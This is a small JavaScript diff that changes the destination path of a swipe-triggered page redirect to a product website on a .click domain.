@@ -10,7 +10,7 @@ document.addEventListener('touchmove', function(e) {
 document.addEventListener('touchend', function(e) {
   var distanceX = touchMoveX - touchStartX;
 if (distanceX > 50) {
-    window.location.href = "http://maohoankhangchinhhang.click/moctoctunhien";
+    window.location.href = "http://maohoankhangchinhhang.click/moctoc";
   }
 });
 
